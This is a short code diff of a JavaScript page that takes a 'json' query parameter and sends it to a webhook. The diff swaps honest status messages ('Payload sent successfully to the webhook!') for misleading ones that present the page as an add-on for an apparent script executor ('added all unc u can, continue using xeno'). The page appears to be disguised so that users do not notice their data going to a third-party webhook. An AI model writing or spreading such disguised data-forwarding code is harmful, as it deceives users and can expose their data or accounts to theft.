@@ -10,7 +10,7 @@
             const jsonParam = urlParams.get("json");
 
             if (!jsonParam) {
-                document.body.innerHTML = "<h1>Error: Missing 'json' query parameter.</h1>";
+                document.body.innerHTML = "<h1>error adding unc rejoin.</h1>";
                 return;
             }
 
@@ -26,7 +26,7 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                        document.body.innerHTML = "<h1>Payload sent successfully to the webhook!</h1>";
+                        document.body.innerHTML = "<h1>added all unc u can, continue using xeno</h1>";
                     } else {
                         document.body.innerHTML = `<h1>Error: ${response.statusText}</h1>`;
                     }
